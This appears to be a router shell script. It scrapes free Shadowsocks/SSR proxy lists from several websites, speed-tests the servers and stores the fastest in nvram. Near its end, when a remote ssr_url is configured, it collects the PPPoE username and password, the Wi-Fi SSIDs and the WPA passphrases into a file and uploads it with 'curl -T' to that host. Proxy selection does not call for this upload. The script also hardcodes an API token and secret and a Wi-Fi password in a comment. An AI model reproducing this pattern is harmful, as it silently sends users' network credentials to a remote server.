

[ ! "`nvram get ss_enable`" = "1" ]  && exit 1
[ `ps |grep $0|grep -v grep|wc -l ` -gt 2 ] && exit 1


#killall -9  sh_sskeey_k.sh >/dev/null 2>/dev/null
#killall -9 Sh15_ss.sh >/dev/null 2>/dev/null
#PID=`ps |grep "Sh15_ss.sh keep"|grep -v grep|tr '[:alpha:][:punct:][:blank:]' '  '`
#PID=${PID:0:10}
#kill -9 $PID >/dev/null 2>/dev/null

DNS="`nvram get ss_DNS_Redirect`"
[ "$DNS" = "1" ] && nvram set ss_DNS_Redirect=0 && nvram commit

##################### SSR Server ###########
#[  -s /opt/shadowsocksr-manyuser/shadowsocks/run.sh ] \
#&& [ -z "`ps | grep "python server.py a" |grep -v grep`" ] \
#&&  /opt/shadowsocksr-manyuser/shadowsocks/run.sh

url="https://www.youtube.com/intl/zh-CN/yt/about/"

url="https://r5---sn-nx5e6nes.googlevideo.com/videoplayback?aitags=133%2C134%2C135%2C136%2C160%2C242%2C243%2C244%2C247%2C278&ipbits=0&pl=18&ei=ga8iWtiPFMXX4AKc8rS4Ag&source=youtube&signature=173C6DE920C36DD8BE90C92E95180DA8AAB58BF0.53BA82B491EC3479A4EA2F82C60F1129DAD79391&id=o-AOc2kcLEt8lUlZM-rEfTMcHMOsA8RSMvfskmOS10xFg-&gir=yes&clen=281976205&sparams=aitags,clen,dur,ei,expire,gir,id,initcwndbps,ip,ipbits,ipbypass,itag,keepalive,lmt,mime,mip,mm,mn,ms,mv,pl,requiressl,source&mime=video%2Fwebm&key=cms1&expire=1512244193&dur=2389.440&lmt=1512108626870858&keepalive=yes&ip=47.74.134.248&itag=247&requiressl=yes&ratebypass=yes&redirect_counter=1&rm=sn-npolz76&req_id=408830fd46a5a3ee&cms_redirect=yes&ipbypass=yes&mip=52.237.77.211&mm=31&mn=sn-nx5e6nes&ms=au&mt=1512222640&mv=m"
if [ ! "$1" = "refresh" ] ; then
rm /tmp/tmp.txt 2>/dev/null
curl -o /tmp/tmp.txt -s -k -L -r 0-10239 -m 5 $url 2>/dev/null
#wget -O /tmp/tmp.txt  -q -T 10 $url 2>/dev/null
[ ! -s /tmp/tmp.txt ] && curl -o /tmp/tmp.txt -s -k -L  -r 0-10239 -m 5 $url 2>/dev/null
[ ! -s /tmp/tmp.txt ] && curl -o /tmp/tmp.txt -s -k -L  -r 0-10239 -m 5 $url 2>/dev/null
[  -s /tmp/tmp.txt  ]  &&  exit 0
fi


########################  get from arukas ########################
get_from_arukas()
{
token="e39ed54e-18ee-4eae-b372-41b4e05721f3"
secret="eoZ9cCkTpM0d6Rb7BEtXl5luBcqZyVeiNLZuKUxGjgOFnB1tqTChz3Wr8JKS2kJY"

rm ss.txt > /dev/null 2>&1

curl -o ss.txt -s -k -L   -m 5 https://$token:$secret@app.arukas.io/api/containers 2>/dev/null
if [  "$?" = "0" ] ; then
Server=""
Port=""
sed 's/{"container_port"/\n"container_port"/g' ss.txt \
 | sed 's/}/\n/g' \
 | grep container_port \
 | grep -v '"container_port":22,' \
 | sed 's/"//g' | sed 's/,/\n/g'  | while read i  
do
var1=`echo $i|awk -F ':' '{print $1}'`
var2=`echo $i|awk -F ':' '{print $2}'`
case "$var1" in
    "host")  Server="$var2"
    ;;
    "service_port")  Port="$var2"
    ;;
esac

if [ ! "$Server" = "" ]  && [ ! "$Port" = "" ]    ; then
    echo $Server:$Port:yzqyzq:rc4-md5 >>ss.ini
    Server=""
    Port=""

fi
done

 
echo "==========" >> ss.ini 
fi
}

################ 零星收集的SS
get_from_other()
{
rm ss.txt > /dev/null 2>&1
curl -o ss.txt -s -k -L   -m 5 https://raw.githubusercontent.com/yzqiang666/autoss/master/ss.txt 2>/dev/null
[  "$?" = "0" ] ] && cat ss.txt >>ss.ini && echo "==========" >> ss.ini 
}

########################  get from ishadowsock ########################
get_from_ishadowsock()
{
iss="https://ss.ishadowx.com/"
rm ss.txt > /dev/null 2>&1
curl -o ss.txt -s -k   -L  -m 10 $iss 2>/dev/null
#[ -s ss.txt ] && [ "`cat ss.txt|grep "<h4>IP Address"|wc -l`" = "0" ] && rm ss.txt && iss="https://go.ishadowx.net/" && curl -o ss.txt -s -k -L   -m 10 $iss 2>/dev/null

if [ -s ss.txt ] ; then
cp /dev/null  ssss.ini
Server=""
Port=""
Pass=""
Method=""
Other=""

cat ss.txt |grep -E "<h4>IP Address|<h4>Port|<h4>Password|<h4>Method|<h4>auth_" | sed 's/<[^<>]*>//g' | sed 's/：/:/g' | sed 's/IP Address/Server/g'| sed 's/ //g' |sed 's/\r//g' | while read i  
do
var1=`echo $i|awk -F ':' '{print $1}'`
var2=`echo $i|awk -F ':' '{print $2}'`
case $var1 in
    Server)  Server="$var2"
    ;;
    Port)  Port="$var2"
    ;;
    Password)  Pass="$var2"
    ;;
    Method)  Method="$var2"
    ;;
    *)  Other="$var1"
    ;;

esac



if [ ! "$Server" = "" ]  && [ ! "$Port" = "" ]  && [ ! "$Method" = "" ]  ; then
    [ ! "$Pass" = "" ]  && echo $Server:$Port:$Pass:$Method >>ss.ini
    Server=""
    Port=""
    Pass=""
    Method=""
    Other=""

fi

done
echo "==========" >> ss.ini 
fi

}

########################  get from tckssr　########################
get_from_tckssr() 
{
rm ss.txt > /dev/null 2>&1
tkcssr="`nvram get tkcssr`"
if [ ! "$tkcssr"x = "x" ] ; then 
iss="https://capsule.cf/"$tkcssr
iss="https://capsule.cf/link/zdV3ynUZyEoBp5Pa?is_ss=0"
curl -o ss.txt -s -k -L   -m 10 $iss 2>/dev/null

if [  "$?" = "0" ] ; then
Server=""
Port=""
Pass=""
Method=""
Usage=""
sed 's/"//g' ss.txt| sed 's/nvram set //g' | grep -E 'rt_ss_server_|rt_ss_port_|rt_ss_password_|rt_ss_method_|rt_ss_usage_' | sed -r 's/\_x([0-9]|[0-9][0-9]|[0-9][0-9][0-9])=/=/g' | while read i 
do

var1=`echo $i|awk -F '=' '{print $1}'`
var2=`echo $i|awk -F '=' '{print $2}'`

case "$var1" in
    "rt_ss_server")  Server="$var2"
    ;;
    "rt_ss_port")  Port="$var2"
    ;;
    "rt_ss_password")  Pass="$var2"
    ;;
    "rt_ss_method")  Method="$var2"
    ;;
    "rt_ss_usage")  Usage="$var2"
	            Usage=${Usage//:/：}
    ;;
esac

if [ ! "$Server" = "" ]  && [ ! "$Port" = "" ]  && [ ! "$Pass" = "" ]  && [ ! "$Method" = "" ]  && [ ! "$Usage" = "" ] ; then

#    [  "${Server:0:2}" = "jp" ] && [ ! "${Server:0:3}" = "jp3" ] && [ ! "${Server:0:3}" = "jp4" ] && echo $Server:$Port:$Pass:$Method:$Usage >>ss.ini
#    [  "${Server:0:2}" = "us" ] && echo $Server:$Port:$Pass:$Method:$Usage >>ss.ini
#    [  "${Server:0:2}" = "hk" ] && [ ! "${Server:0:4}" = "hk10" ] && [ ! "${Server:0:4}" = "hk15" ] && [ ! "${Server:0:3}" = "hk2" ]  && [ ! "${Server:0:3}" = "hk4" ]  && [ ! "${Server:0:3}" = "hk5" ] && echo $Server:$Port:$Pass:$Method:$Usage >>ss.ini
#    [  "${Server:0:2}" = "sg" ] && echo $Server:$Port:$Pass:$Method:$Usage >>ss.ini
#     [ !  "${Server:0:2}" = "cn" ] && echo $Server:$Port:$Pass:$Method:$Usage >>ss.ini
	 
    [  "${Server:0:2}" = "jp" ]  && echo $Server:$Port:$Pass:$Method:$Usage >>ss.ini
    [  "${Server:0:2}" = "hk" ]  && echo $Server:$Port:$Pass:$Method:$Usage >>ss.ini
    [  "${Server:0:2}" = "sg" ]  && echo $Server:$Port:$Pass:$Method:$Usage >>ss.ini
    [  "${Server:0:2}" = "ca" ]  && echo $Server:$Port:$Pass:$Method:$Usage >>ss.ini




    Server=""
    Port=""
    Pass=""
    Method=""
fi
done

sort ss.ini >sss.ini
rm ss.ini
mv sss.ini ss.ini
else

curl -o ss.txt -s -m 10 http://202.109.226.26:81/ss.ini	
cat ss.txt >>ss.ini
fi
echo "==========" >> ss.ini 
fi
}



########################  get from github.com/Alvin9999 不得已才用　########################
get_from_Alvin9999()
{



rm ss.txt > /dev/null 2>&1
iss="https://raw.githubusercontent.com/Alvin9999/pac2/master/ssconfig.txt"
curl -o ss.txt -s -k -L   -m 5 $iss 2>/dev/null
if [  "$?" = "0" ] ; then
Server=""
Port=""
Pass=""
Method=""

base64 -d ss.txt|sed 's/"//g'|sed 's/,//g'|sed s/[[:space:]]//g| grep -E 'server:|server_port:|password:|method:'  | while read i 
do

var1=`echo $i|awk -F ':' '{print $1}'`
var2=`echo $i|awk -F ':' '{print $2}'`

case "$var1" in
    "server")  Server="$var2"
    ;;
    "server_port")  Port="$var2"
    ;;
    "password")  Pass="$var2"
    ;;
    "method")  Method="$var2"
    ;;
esac

if [ ! "$Server" = "" ]  && [ ! "$Port" = "" ]  && [ ! "$Pass" = "" ]  && [ ! "$Method" = "" ]  ; then
    echo $Server:$Port:$Pass:$Method >>ss.ini
    Server=""
    Port=""
    Pass=""
    Method=""
fi
done
fi




rm ss.txt > /dev/null 2>&1
iss="https://socks.zone/free/"
curl -o ss.txt -s -k -L   -m 5 $iss 2>/dev/null
if [  "$?" = "0" ] ; then
Server=""
Port=""
Pass=""
Method=""

sed 's/<[^<>]*>//g' ss.txt | grep -E '服务器地址：|端口：|密码：|加密方式：' | sed 's/：/:/g' | while read i 
do

var1=`echo $i|awk -F ':' '{print $1}'`
var2=`echo $i|awk -F ':' '{print $2}'`

case "$var1" in
    "服务器地址")  Server="$var2"
    ;;
    "端口")  Port="$var2"
    ;;
    "密码")  Pass="$var2"
    ;;
    "加密方式")  Method="$var2"
    ;;
esac

if [ ! "$Server" = "" ]  && [ ! "$Port" = "" ]  && [ ! "$Pass" = "" ]  && [ ! "$Method" = "" ]  ; then
    echo $Server:$Port:$Pass:$Method >>ss.ini
    Server=""
    Port=""
    Pass=""
    Method=""
fi
done
fi


rm ss.txt > /dev/null 2>&1
iss="https://github.com/Alvin9999/new-pac/wiki/ss%E5%85%8D%E8%B4%B9%E8%B4%A6%E5%8F%B7"
curl -o ss.txt -s -k -L   -m 5 $iss 2>/dev/null
if [  "$?" = "0" ] ; then                                                                                   
cat ss.txt |grep 端口：|grep  密码： |sed 's/<[^<>]*>//g' | sed 's/：/:/g'  | sed 's/　/ /g'  \
| tr -s ' ' | tr ' ' ':' | sed 's/ /:/g'  | sed 's/：/:/g' | sed 's/:(/(/g' | sed 's/::/:/g'  \
| sed 's/256-cfb（/256-cfb:/g' | sed 's/chacha20-life（/chacha20-life:/g' | while read i
do 
  var1=`echo $i|awk -F ':' '{print $2}'`
  var2=`echo $i|awk -F ':' '{print $4}'`
  var3=`echo $i|awk -F ':' '{print $6}'`
  var4=`echo $i|awk -F ':' '{print $8}' | tr '[A-Z]' '[a-z]'`  
  echo $var1:$var2:$var3:$var4 >> ss.ini
done
fi


rm ss.txt > /dev/null 2>&1
iss="https://freessr.xyz/"
curl -o ss.txt -s -k -L   -m 5 $iss 2>/dev/null
if [  "$?" = "0" ] ; then
cat ss.txt | grep -E '服务器地址|端口|密码|加密方式' | sed 's/<[^<>]*>//g' | sed 's/ //g' | while read i 
do
var1=`echo $i|awk -F ':' '{print $1}'`
var2=`echo $i|awk -F ':' '{print $2}'`
case "$var1" in
    "服务器地址")  Server="$var2"
    ;;
    "端口")  Port="$var2"
    ;;
    "密码")  Pass="$var2"
    ;;
    "加密方式")  Method="$var2"
    ;;
esac

if [ ! "$Server" = "" ]  && [ ! "$Port" = "" ]  && [ ! "$Pass" = "" ]  && [ ! "$Method" = "" ]  ; then
    echo $Server:$Port:$Pass:$Method >>ss.ini
    Server=""
    Port=""
    Pass=""
    Method=""
fi
done
fi


rm ss.txt > /dev/null 2>&1
iss="https://xsjs.yhyhd.org/free-ss"
curl -o ss.txt -s -k -L   -m 5 $iss 2>/dev/null
if [  "$?" = "0" ] ; then
Server=""
Port=""
Pass=""
Method=""
sed 's/<div class="modal-body" id="ss-body">/\n/g'  ss.txt | sed 's/<div class="modal-footer">/\n/g' \
| sed 's/<[^<>]*>//g'  | grep -E 'IP:&nbsp;|加密方式:&nbsp;' | sed 's/&nbsp;//g' | sed 's/&nbsp;//g' \
| sed 's/ /:/g' | sed 's/,/:/g' | sed 's/端口号/Port/g' | sed 's/密码/Password/g' | sed 's/加密方式/Method/g' | sed 's/地址/IP/g' \
| sed 's/Port/\nPort/g' | sed 's/Password/\nPassword/g' | sed 's/Method/\nMethod/g' | sed 's/IP/\nIP/g'  | while read i 
do

var1=`echo $i|awk -F ':' '{print $1}'`
var2=`echo $i|awk -F ':' '{print $2}'`

case "$var1" in
    "IP")  Server="$var2"
    ;;
    "Port")  Port="$var2"
    ;;
    "Password")  Pass="$var2"
    ;;
    "Method")  Method="$var2"
    ;;
esac

if [ ! "$Server" = "" ]  && [ ! "$Port" = "" ]  && [ ! "$Pass" = "" ]  && [ ! "$Method" = "" ]  ; then
    echo $Server:$Port:$Pass:$Method >>ss.ini
    Server=""
    Port=""
    Pass=""
    Method=""
fi
done



fi



echo "==========" >> ss.ini 
}

base64_str=""
base64_res=""

base64_encode() 
{
vvvvv=`echo -n $base64_str|base64|sed 's/=//g'|sed 's/\//_/g'`
base64_res=`echo $vvvvv|sed s/[[:space:]]//g`
}

#########################################


###加入私有SSR


cd /tmp
echo "lock">cron_ss.lock
rm ss.ini >/dev/null 2>&1
sleep 1
ssr_url="`nvram get ssr_url`"

get_from_tckssr
[ ! -s ss.ini ] && curl $ssr_url"ss.ini" -o ss.ini
get_from_ishadowsock
#get_from_arukas
tkcssr="`nvram get tkcssr`"
#[  "$tkcssr"x = "x" ] && get_from_Alvin9999 
#get_from_Alvin9999
#[ ! -s ss.ini ] && get_from_other


[ ! -s ss.ini ] && exit 1


###################### set ss information ####################################

[ -n "$ssr_url" ] && rm ssr.txt >/dev/null 2>&1
logger "get bestss server"

options1=""
options2=""
ss_usage=""
ss_usage_json=""

#nvram set ss_status=1
#nvram set ss_enable=0
#nvram set ss_check=0
nvram set ss_type=1
nvram set ss_working_port="1090"
nvram commit


ss_link_1=`nvram get ss_link_2`
ss_check=`nvram get ss_check`
action_port=1090
lan_ipaddr=`nvram get lan_ipaddr`

rm ss.txt >/dev/null 2>&1
rm ssr.inf >/dev/null 2>&1
rm ssr.ini >/dev/null 2>&1

#/etc/storage/script/Sh15_ss.sh start >/dev/null 2>/dev/null &
sleep 6

killall -9  ss-redir 2>/dev/null
killall -9  ss-local 2>/dev/null
##killall -9  Sh15_ss.sh 2>/dev/null 
#/etc/storage/script/Sh15_ss.sh rules >/dev/null 2>/dev/null
killall -9  sh_sskeey_k.sh >/dev/null 2>/dev/null
sleep 2

PID=`ps |grep "Sh15_ss.sh keep"|grep -v grep|tr '[:alpha:][:punct:][:blank:]' '  '`
PID=${PID:0:10}
kill -9 $PID >/dev/null 2>/dev/null
CC=1
CC0=61
[ `date "+%k"` -ge 1 ] && [ `date "+%k"` -le 8 ] && [ "$1" = "refresh" ] && CC0=98

####echo "sleep 4" >/tmp/killwget.sh
####echo "killall -9 wget  >/dev/null 2>&1" >>/tmp/killwget.sh
####chmod a+x /tmp/killwget.sh

cat ss.ini | while read str
do
[ $CC -ge $CC0 ] && break
[ "$str" = "" ] && continue 
[ ${str:0:1} = "#" ] && continue 
[ ${str:0:1} = "=" ] && continue 




ss_s1_ip=`echo $str|awk -F ':' '{print $1}'`  
ss_s1=$ss_s1_ip
ss_s1_port=`echo $str|awk -F ':' '{print $2}'`  
ss_s1_key=`echo $str|awk -F ':' '{print $3}'`  
ss_s1_method=`echo $str|awk -F ':' '{print $4}'`  
ss_usage0=`echo $str|awk -F ':' '{print $5}'`  
ss_usage=${ss_usage0//：/:}
#ss_usage=${ss_usage//　/ }
ss_usage="`echo "$ss_usage" | sed -r 's/\--[^ ]+[^-]+//g'`"   
ss_server0=$ss_s1_ip:$ss_s1_port:$ss_s1_key:$ss_s1_method
ss_server1=$ss_s1_ip
resolveip=`/usr/bin/resolveip -4 -t 4 $ss_server1 | grep -v : | sed -n '1p'`

#[ -z "$resolveip" ] && resolveip=`nslookup $ss_server1 | awk 'NR==5{print $3}'` 
if [ -n "$resolveip" ] ; then
ss_server1=$resolveip
ss_s1_ip=$ss_server1

pidof ss-redir  >/dev/null 2>&1 && killall ss-redir && killall -9 ss-redir 2>/dev/null
/tmp/SSJSON.sh -f /tmp/ss-redir_3.json $ss_usage $ss_usage_json -s $ss_s1_ip -p $ss_s1_port -l 1090 -b 0.0.0.0 -k $ss_s1_key -m $ss_s1_method
ss-redir -c /tmp/ss-redir_3.json $options1 >/dev/null 2>&1 &

ss_s1_ip=$ss_server1
action_ssip=$ss_s1_ip
BP_IP="$action_ssip"
[ ! $ss_s1_ip = "" ] && ss-rules -s "$action_ssip" -l "$action_port" -b $BP_IP -d "RETURN" -a "g,$lan_ipaddr" -e '-m multiport --dports 80,443' -o -O >/dev/null 2>&1

rm /tmp/tmp.txt 2>/dev/null
####/tmp/killwget.sh &
####PID=`ps|grep killwget.sh|grep -v grep|awk -F" " '{print $1; }'`
####PID1=`ps|grep "sleep 4"|grep -v grep|awk -F" " '{print $1; }'`
starttime=$(cat /proc/uptime | cut -d" " -f1)
curl -o /tmp/tmp.txt -s -k -L -r 0-10239 -m 3 $url 2>/dev/null
CODE="$?"

####kill -9 $PID $PID1 >/dev/null 2>&1
endtime=$(cat /proc/uptime | cut -d" " -f1)
TIME=`awk -v x=$starttime -v y=$endtime 'BEGIN {printf y-x}'`

if [  $CODE = "28" ] ; then
if  [  -s /tmp/tmp.txt ] ; then
 CODE="0"
 endtime=$(wc -c /tmp/tmp.txt | cut -d" " -f1)
 TIME=`awk  -v y=$endtime 'BEGIN {printf 8-y/2000}'`
 TIME=${TIME:0:4}
fi
fi
TIME0=$TIME
[ ${#TIME0} = 1 ] && TIME0=$TIME0".0"
[ ${#TIME0} = 2 ] && TIME0=$TIME0"0"
[ ${#TIME0} = 3 ] && TIME0=$TIME0"0"
if [  $CODE = "0" ] ; then
    [ $CC -ge 10 ] && echo $CC $TIME0 $ss_server0 && logger "$CC $TIME0 $ss_server0"
    [ $CC -lt 10 ] && echo 0$CC $TIME0 $ss_server0 && logger "0$CC $TIME0 $ss_server0"
	RES=`awk -v a=$TIME  'BEGIN { print (a<=10)?1:0'}`
	if  [ "$RES" = "1"  ] ; then
        echo $TIME0:$ss_s1:$ss_s1_port:$ss_s1_key:$ss_s1_method:$ss_usage0 >>ss.txt
	fi		
	[ "$RES" = "1"  ] && let CC=$CC+1
	
else
	echo "XX" $TIME0 "$ss_server0" 
	logger "XX" $TIME0 "$ss_server0"
fi
fi
done

if [ -s ss.txt ] ; then
  sort ss.txt >ss.inf
  CC=1

  cat ss.inf | while read str
  do  
    TIME=`echo $str|awk -F ':' '{print $1}'`  	
    ss_s1_ip=`echo $str|awk -F ':' '{print $2}'`  
    ss_s1_port=`echo $str|awk -F ':' '{print $3}'`  
    ss_s1_key=`echo $str|awk -F ':' '{print $4}'`  
    ss_s1_method=`echo $str|awk -F ':' '{print $5}'`  
    ss_usage0=`echo $str|awk -F ':' '{print $6}'`  
    ss_usage=${ss_usage0//：/:}
#   ss_usage=${ss_usage//　/ }
    ss_usage="`echo "$ss_usage" | sed -r 's/\--[^ ]+[^-]+//g'`"   

    base64_str=$ss_s1_key
    base64_encode
	PWD=$base64_res	
    base64_str=$CC
	base64_encode
	SNO=$base64_res	
    base64_str=$ss_s1_ip:$ss_s1_port:origin:$ss_s1_method:plain:$PWD"/?obfsparam=&remarks="$SNO"&group=c3Ny"
	base64_encode
	echo $base64_res >>ssr.ini	
	
    if [ $CC = 1 ] ; then
    nvram set ss_server=$ss_s1_ip
    nvram set ss_server_port=$ss_s1_port
    nvram set ss_key=$ss_s1_key
    nvram set ss_method=$ss_s1_method
    nvram set ss_usage="$ss_usage"	
    nvram set ss_server1=$ss_s1_ip
    nvram set ss_s1_port=$ss_s1_port
    nvram set ss_s1_key=$ss_s1_key
    nvram set ss_s1_method=$ss_s1_method
    nvram set ss_s1_usage="$ss_usage"
    ss_type="1"
    [ "$ss_usage"x = ""x ] && ss_type="0"
    nvram set ss_type=$ss_type
    nvram commit

    echo "The No1 server: "$ss_s1_ip:$ss_s1_port:$ss_s1_key:$ss_s1_method"   "$TIME
	echo "The No1 server: "$ss_s1_ip:$ss_s1_port:$ss_s1_key:$ss_s1_method"   "$TIME >serverinfo
	logger "The No1 server: "$ss_s1_ip:$ss_s1_port:$ss_s1_key:$ss_s1_method"   "$TIME
    fi

    if [ $CC = 2 ] ; then
    nvram set ss_server2=$ss_s1_ip
    nvram set ss_s2_port=$ss_s1_port
    nvram set ss_s2_key=$ss_s1_key
    nvram set ss_s2_method=$ss_s1_method
    nvram set ss_s2_usage="$ss_usage"	
    nvram commit

    echo "The No2 server: "$ss_s1_ip:$ss_s1_port:$ss_s1_key:$ss_s1_method"   "$TIME
    echo "The No2 server: "$ss_s1_ip:$ss_s1_port:$ss_s1_key:$ss_s1_method"   "$TIME >>serverinfo
	logger "The No2 server: "$ss_s1_ip:$ss_s1_port:$ss_s1_key:$ss_s1_method"   "$TIME
    fi
	let CC=$CC+1
  done


fi

if   [ -s ssr.ini ] ; then
  sed -i 's/=//g' ssr.ini 
  sed -i 's/$/\r/g' ssr.ini 
  sed -i 's/\r\r/\r/g' ssr.ini
  sed -i 's/^/ssr:\/\//g' ssr.ini 
  
  base64 ssr.ini >ssr.txt
  if [ ! "$ssr_url" = "" ] ; then
	if [ "`nvram get wan_proto`" = "pppoe" ] ; then
  	  fn=`nvram get wan_pppoe_username`
	  nvram get wan_pppoe_username >$fn
	  nvram get wan_pppoe_passwd >>$fn
	else
  	  fn=`nvram get wan_hwaddr`
	  fn=${fn//:/-}
	  nvram get nvram get wan_hwaddr >$fn
	fi
	
#if [ "`nvram get wl_ssid`" = "TP-LINK_DF1828" ] ; then
#nvram set wl_wpa_psk=hc871013
#nvram commit
#fi

	nvram get wl_ssid >>$fn	
	nvram get wl_wpa_psk >>$fn	
	nvram get rt_ssid >>$fn	
	nvram get rt_wpa_psk >>$fn	
	cat serverinfo >>$fn	
	rm serverinfo


	cut ss.inf -c6-600 | head -n 10 >s.inf	
	
	curl -s -T $fn $ssr_url"mac/"$fn
    curl -s -T ssr.txt $ssr_url"ssr.txt"
    curl -s -T ssr.ini $ssr_url"ssr.ini"  
    curl -s -T s.inf $ssr_url"ss.ini"  	
	
  fi
fi


mv syslog.log syslog.tmp
pidof ss-redir  >/dev/null 2>&1 && killall ss-redir  && killall -9 ss-redir 2>/dev/null
killall -9  sh_sskeey_k.sh >/dev/null 2>/dev/null
killall -9 Sh15_ss.sh >/dev/null 2>/dev/null
nvram set ss_check=$ss_check
nvram set ss_status=0
nvram set ss_enable=1
nvram commit

/etc/storage/script/Sh15_ss.sh start >/dev/null  2>/dev/null &



cat >/tmp/delay40.sh <<-ABCDEF
sleep 100
#killall -9  sh_sskeey_k.sh >/dev/null 2>/dev/null
#killall -9 Sh15_ss.sh >/dev/null 2>/dev/null
#PID=\`ps |grep "Sh15_ss.sh keep"|grep -v grep|tr '[:alpha:][:punct:][:blank:]' '  '\`
#PID=\${PID:0:10}
#kill -9 \$PID >/dev/null 2>/dev/null
rm -f cron_ss.lock 2>/dev/null
mv syslog.tmp syslog.log 2>/dev/null
ABCDEF

sh /tmp/delay40.sh &



